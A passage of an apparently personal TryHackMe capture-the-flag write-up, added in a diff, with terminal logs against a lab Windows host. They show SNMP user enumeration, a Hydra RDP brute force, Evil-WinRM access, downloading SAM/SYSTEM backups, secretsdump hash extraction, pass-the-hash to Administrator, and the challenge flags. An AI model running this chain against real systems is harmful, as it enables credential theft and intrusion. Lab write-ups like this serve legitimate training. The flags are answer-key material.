@@ -395,3 +395,202 @@ Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)
   Memory used                   : 862.88 MB
 
   Description                   : ["Physical Memory"]
+  Device id                     : [#<SNMP::Integer:0x00007f89e3deb290 @value=3>]
+  Filesystem type               : ["unknown"]
+  Device unit                   : [#<SNMP::Integer:0x00007f89e3deecd8 @value=65536>]
+  Memory size                   : 2.00 GB
+  Memory used                   : 774.75 MB
+
+[*] File system information:
+
+  Index                         : 1
+  Mount point                   : 
+  Remote mount point            : -
+  Access                        : 1
+  Bootable                      : 0
+
+[*] Device information:
+
+  Id                    Type                  Status                Descr               
+  1                     unknown               running               Microsoft XPS Document Writer v4
+  2                     unknown               running               Microsoft Print To PDF
+  3                     unknown               running               Unknown Processor Type
+  4                     unknown               unknown               Software Loopback Interface 1
+  5                     unknown               unknown               Microsoft 6to4 Adapter
+  6                     unknown               unknown               Microsoft IP-HTTPS Platform Adapter
+  7                     unknown               unknown               Microsoft Kernel Debug Network Adapter
+  8                     unknown               unknown               Intel(R) 82574L Gigabit Network Connection
+  9                     unknown               unknown               Microsoft Teredo Tunneling Adapter
+  10                    unknown               unknown               AWS PV Network Device #0
+  11                    unknown               unknown               AWS PV Network Device #0-WFP Native MAC Layer LightWeight Filter
+  12                    unknown               unknown               AWS PV Network Device #0-QoS Packet Scheduler-0000
+  13                    unknown               unknown               AWS PV Network Device #0-WFP 802.3 MAC Layer LightWeight Filter-
+  14                    unknown               running               Fixed Disk          
+  15                    unknown               running               Fixed Disk          
+  16                    unknown               running               IBM enhanced (101- or 102-key) keyboard, Subtype=(0)
+  17                    unknown               unknown               COM1:               
+
+[*] Software components:
+
+  Index                 Name                
+  1                     XAMPP               
+  2                     Microsoft Visual C++ 2017 x64 Minimum Runtime - 14.11.25325
+  3                     Microsoft Visual C++ 2017 x64 Additional Runtime - 14.11.25325
+  4                     Amazon SSM Agent    
+  5                     Amazon SSM Agent    
+  6                     Microsoft Visual C++ 2017 Redistributable (x64) - 14.11.25325
+
+or
+
+https://github.com/etingof/snmpsim/blob/master/data/foreignformats/winxp1.snmpwalk
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ snmpwalk -c openview -v1 10.10.220.228 1.3.6.1.4.1.77.1.2.25
+iso.3.6.1.4.1.77.1.2.25.1.1.5.71.117.101.115.116 = STRING: "Guest"
+iso.3.6.1.4.1.77.1.2.25.1.1.6.74.97.114.101.116.104 = STRING: "Jareth"
+iso.3.6.1.4.1.77.1.2.25.1.1.13.65.100.109.105.110.105.115.116.114.97.116.111.114 = STRING: "Administrator"
+iso.3.6.1.4.1.77.1.2.25.1.1.14.68.101.102.97.117.108.116.65.99.99.111.117.110.116 = STRING: "DefaultAccount"
+iso.3.6.1.4.1.77.1.2.25.1.1.18.87.68.65.71.85.116.105.108.105.116.121.65.99.99.111.117.110.116 = STRING: "WDAGUtilityAccount"
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ hydra -l Jareth -P /usr/share/wordlists/rockyou.txt 10.10.220.228 rdp   
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
+[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
+[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
+[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking rdp://10.10.220.228:3389/
+[STATUS] 162.00 tries/min, 162 tries in 00:01h, 14344237 to do in 1475:45h, 4 active
+[3389][rdp] account on 10.10.220.228 might be valid but account not active for remote desktop: login: Jareth password: sarah, continuing attacking the account.
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ evil-winrm -i 10.10.220.228 -u Jareth
+Enter Password: 
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Jareth\Documents> cd ..\Desktop
+*Evil-WinRM* PS C:\Users\Jareth\Desktop> dir
+
+    Directory: C:\Users\Jareth\Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        9/18/2020   2:21 AM             80 user.txt
+
+*Evil-WinRM* PS C:\Users\Jareth\Desktop> more user.txt
+THM{Y2I0NDJjODY2NTc2YmI2Y2U4M2IwZTBl}
+
+*Evil-WinRM* PS C:\Users\Jareth\Desktop> cd \
+*Evil-WinRM* PS C:\> gci -hidden .
+
+    Directory: C:\
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d--hs-        9/18/2020   2:14 AM                $Recycle.Bin
+d--hsl        9/17/2020   7:27 PM                Documents and Settings
+d--h--        9/18/2020   2:04 AM                ProgramData
+d--hs-        9/17/2020   7:27 PM                Recovery
+d--hs-        9/17/2020   7:26 PM                System Volume Information
+-a-hs-        6/30/2023   2:05 AM     1207959552 pagefile.sys
+
+*Evil-WinRM* PS C:\> gci -path 'C:\$Recycle.Bin' -h
+
+    Directory: C:\$Recycle.Bin
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d--hs-        9/18/2020   7:28 PM                S-1-5-21-1987495829-1628902820-919763334-1001
+d--hs-       11/13/2020  10:41 PM                S-1-5-21-1987495829-1628902820-919763334-500
+
+*Evil-WinRM* PS C:\> cd 'C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-500'
+*Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-500> gci
+Access to the path 'C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-500' is denied.
+At line:1 char:1
++ gci
++ ~~~
+    + CategoryInfo          : PermissionDenied: (C:\$Recycle.Bin...0-919763334-500:String) [Get-ChildItem], UnauthorizedAccessException
+    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
+*Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-500> cd ..
+*Evil-WinRM* PS C:\$Recycle.Bin> gci
+*Evil-WinRM* PS C:\$Recycle.Bin> gci -h
+
+    Directory: C:\$Recycle.Bin
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d--hs-        9/18/2020   7:28 PM                S-1-5-21-1987495829-1628902820-919763334-1001
+d--hs-       11/13/2020  10:41 PM                S-1-5-21-1987495829-1628902820-919763334-500
+
+*Evil-WinRM* PS C:\$Recycle.Bin> cd S-1-5-21-1987495829-1628902820-919763334-1001
+*Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001> gci
+
+    Directory: C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        9/18/2020   7:28 PM          49152 sam.bak
+-a----        9/18/2020   7:28 PM       17457152 system.bak
+
+*Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001> copy sam.bak C:\Windows\Temp\sam.bak
+*Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001> copy system.bak C:\Windows\Temp\system.bak
+
+*Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001> download C:\Windows\Temp\sam.bak /home/witty/Downloads/sam.bak
+Info: Downloading C:\Windows\Temp\sam.bak to /home/witty/Downloads/sam.bak
+
+                                                             
+Info: Download successful!
+
+*Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001> download C:\Windows\Temp\system.bak /home/witty/Downloads/system.bak
+Info: Downloading C:\Windows\Temp\system.bak to /home/witty/Downloads/system.bak
+
+                                                             
+Info: Download successful!
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ secretsdump.py -sam sam.bak -system system.bak LOCAL 
+Impacket v0.10.1.dev1+20230616.115447.d1f16d8e - Copyright 2022 Fortra
+
+[*] Target system bootKey: 0xd676472afd9cc13ac271e26890b87a8c
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:39a21b273f0cfd3d1541695564b4511b:::
+Jareth:1001:aad3b435b51404eeaad3b435b51404ee:5a6103a83d2a94be8fd17161dfd4555a:::
+[*] Cleaning up... 
+                                                                                          
+┌──(witty㉿kali)-[~/Downloads]
+└─$ evil-winrm -u Administrator -H 6bc99ede9edcfecf9662fb0c0ddcfa7a -i 10.10.220.228
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> gc ..\Desktop\*txt
+THM{YWFjZTM1MjFiZmRiODgyY2UwYzZlZWM2}
+```
+User Flag
+Admin Flag
+
+## Flags / Answers
+- ***THM{Y2I0NDJjODY2NTc2YmI2Y2U4M2IwZTBl}***
+- ***THM{YWFjZTM1MjFiZmRiODgyY2UwYzZlZWM2}***
+
+## Notes / Lessons Learned
+[[Year of the Jellyfish]]
+
